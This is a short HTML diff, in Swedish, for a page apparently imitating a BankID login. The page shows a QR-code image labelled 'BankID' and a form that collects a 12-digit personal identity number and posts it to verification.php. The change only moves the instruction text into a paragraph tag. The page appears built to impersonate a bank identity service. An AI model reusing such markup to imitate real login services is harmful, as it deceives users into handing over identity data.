@@ -5,8 +5,8 @@
             <img class="fade-in" src="https://randomqr.com/assets/images/rickroll-qrcode.webp" alt="BankID">
         </div>
         
-        Skanna QR-koden med BankID-appen på din telefon eller ange ditt personnummer:
         <form method="POST" action="verification.php">
+            <p>Skanna QR-koden med BankID-appen på din telefon eller ange ditt personnummer:</p>
             <input type="text" name="pnr" pattern="[0-9]{12}" required="" maxlength="12" placeholder="ÅÅÅÅMMDDXXXX"></input>
             <button class="push-button" type="submit">→</button>
         </form>
